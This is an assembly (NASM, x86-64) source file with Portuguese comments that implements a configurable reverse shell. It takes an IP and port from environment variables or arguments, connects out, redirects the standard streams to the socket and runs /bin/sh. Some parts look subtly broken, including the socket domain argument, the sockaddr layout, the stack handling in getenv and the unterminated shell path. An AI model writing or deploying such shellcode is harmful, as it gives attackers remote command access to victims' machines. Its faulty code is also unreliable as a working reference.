section .data
    ; Valores padrão
    default_ip dd 0x0100007f     ; 127.0.0.1 em little endian
    default_port dw 0x115c       ; 4444 em hexadecimal (big endian)
    
    ; Nomes das variáveis de ambiente
    env_ip db "REMOTE_IP", 0
    env_port db "REMOTE_PORT", 0

section .bss
    ip_addr resd 1               ; Endereço IP final a ser usado
    port_num resw 1              ; Número da porta final a ser usado
    buffer resb 128              ; Buffer para processar strings

section .text
    global _start

; Função para converter string decimal para inteiro
; Entrada: rsi = ponteiro para string
; Saída: rax = valor numérico
atoi:
    xor rax, rax                 ; Inicializa resultado como 0
    xor rcx, rcx                 ; Contador de dígitos
.next_digit:
    movzx rdx, byte [rsi + rcx]  ; Carrega próximo caractere
    test rdx, rdx
    jz .done                     ; Se zero, fim da string
    sub rdx, '0'                 ; Converte ASCII para número
    cmp rdx, 9
    ja .done                     ; Se > 9, não é dígito
    imul rax, rax, 10            ; Multiplica resultado atual por 10
    add rax, rdx                 ; Adiciona novo dígito
    inc rcx                      ; Próximo caractere
    jmp .next_digit
.done:
    ret

; Função para converter string IP para valor binário
; Entrada: rsi = ponteiro para string IP (formato "a.b.c.d")
; Saída: eax = representação binária do IP em formato de rede
parse_ip:
    push rbp
    mov rbp, rsp
    sub rsp, 16                  ; Espaço local para os 4 octetos

    xor rcx, rcx                 ; Contador de octetos
    xor rdx, rdx                 ; Valor temporário
    xor rax, rax                 ; Valor acumulado

.parse_octet:
    xor rdx, rdx
.next_digit:
    movzx r8, byte [rsi]
    test r8, r8
    jz .last_octet               ; Fim da string
    cmp r8, '.'
    je .octet_done               ; Fim do octeto atual
    
    sub r8, '0'
    cmp r8, 9
    ja .error                    ; Caractere inválido
    
    imul rdx, rdx, 10
    add rdx, r8
    
    inc rsi
    jmp .next_digit

.octet_done:
    inc rsi                      ; Pula o '.'
    
    cmp rdx, 255
    ja .error                    ; Valor de octeto inválido
    
    mov [rbp-16+rcx], dl         ; Armazena octeto
    inc rcx
    cmp rcx, 3
    jb .parse_octet              ; Se < 3, continua
    jmp .next_digit              ; Último octeto

.last_octet:
    cmp rdx, 255
    ja .error
    mov [rbp-16+rcx], dl

    ; Agora construa o valor de IP completo
    xor eax, eax
    mov al, [rbp-16+3]           ; octet 3 (LSB)
    shl eax, 8
    mov al, [rbp-16+2]           ; octet 2
    shl eax, 8
    mov al, [rbp-16+1]           ; octet 1
    shl eax, 8
    mov al, [rbp-16+0]           ; octet 0 (MSB)
    
    mov rsp, rbp
    pop rbp
    ret

.error:
    mov eax, [default_ip]        ; Em caso de erro, usa IP padrão
    mov rsp, rbp
    pop rbp
    ret

; Função para obter valor de variável de ambiente
; Entrada: rdi = nome da variável
; Saída: Se encontrado, rax = ponteiro para valor, senão rax = 0
getenv:
    xor rcx, rcx                 ; Índice do envp
    mov r8, [rsp]                ; argc (em main)
    lea r9, [rsp + 8]            ; argv (em main)
    lea r9, [r9 + r8*8]          ; r9 aponta para envp
    add r9, 8                    ; Pula o NULL entre argv e envp

.next_env:
    mov rsi, [r9 + rcx*8]        ; Próxima variável de ambiente
    test rsi, rsi
    jz .not_found                ; Se NULL, fim das variáveis

    ; Comparar nome da variável
    mov rdx, rdi                 ; rdx = nome buscado
.compare:
    movzx rax, byte [rsi]
    movzx rbx, byte [rdx]
    test al, al
    jz .check_end
    test bl, bl
    jz .next_var
    cmp al, bl
    jne .next_var
    cmp al, '='
    je .found_env
    inc rsi
    inc rdx
    jmp .compare

.check_end:
    cmp byte [rdx], 0
    jne .next_var
    cmp byte [rsi], '='
    je .found_env

.next_var:
    inc rcx
    jmp .next_env

.found_env:
    ; Encontramos, retorna ponteiro para o valor (após o '=')
    movzx rax, byte [rsi]
    cmp al, '='
    je .return_value
    inc rsi
    jmp .found_env

.return_value:
    inc rsi                      ; Pula o '='
    mov rax, rsi
    ret

.not_found:
    xor rax, rax
    ret

_start:
    ; Inicializa com valores padrão
    mov eax, [default_ip]
    mov [ip_addr], eax
    mov ax, [default_port]
    mov [port_num], ax

    ; Verificar variáveis de ambiente
    mov rdi, env_ip
    call getenv
    test rax, rax
    jz .check_port_env           ; Se não encontrado, pula
    
    ; Processar IP da variável de ambiente
    mov rsi, rax
    call parse_ip
    mov [ip_addr], eax

.check_port_env:
    mov rdi, env_port
    call getenv
    test rax, rax
    jz .check_args               ; Se não encontrado, pula
    
    ; Processar porta da variável de ambiente
    mov rsi, rax
    call atoi
    ; Converter para network byte order (big endian)
    xchg ah, al
    mov [port_num], ax

.check_args:
    ; Verificar argumentos de linha de comando
    mov rdi, [rsp]               ; argc
    cmp rdi, 3                   ; Programa + IP + Porta
    jl .connect                  ; Se menos que 3, usa valores atuais
    
    ; Processar IP do argumento
    mov rsi, [rsp + 16]          ; argv[1]
    call parse_ip
    mov [ip_addr], eax
    
    ; Processar porta do argumento
    mov rsi, [rsp + 24]          ; argv[2]
    call atoi
    ; Converter para network byte order (big endian)
    xchg ah, al
    mov [port_num], ax

.connect:
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor rax, rax
    mov al, 41
    xor rdi, rdi                 ; AF_INET (2) será definido na struct
    mov sil, 1                   ; SOCK_STREAM
    xor rdx, rdx                 ; protocol = 0
    syscall

    mov rdi, rax                 ; sockfd

    ; struct sockaddr_in setup com valores configurados
    mov eax, [ip_addr]
    push rax                     ; IP configurado
    xor rax, rax
    mov ax, [port_num]
    shl rax, 16
    mov ax, 2                    ; AF_INET
    push rax

    mov rsi, rsp                 ; ponteiro para struct sockaddr
    mov al, 42                   ; syscall: connect
    mov rdx, 16                  ; sizeof(sockaddr_in)
    syscall

    ; verifica erro
    test rax, rax
    js fail

    ; dup2 loop (stdin, stdout, stderr)
    xor rsi, rsi

dup_loop:
    mov al, 33                   ; syscall: dup2
    syscall
    inc rsi
    cmp rsi, 3
    jl dup_loop

    ; execve("/bin/sh", NULL, NULL)
    xor rax, rax
    mov rbx, 0x68732f6e69622f2f  ; //bin/sh
    push rbx
    mov rdi, rsp                 ; pathname
    xor rsi, rsi                 ; argv = NULL
    xor rdx, rdx                 ; envp = NULL
    mov al, 59                   ; syscall: execve
    syscall

fail:
    ; exit(1)
    mov rdi, 1
    mov al, 60                   ; syscall: exit
    syscall
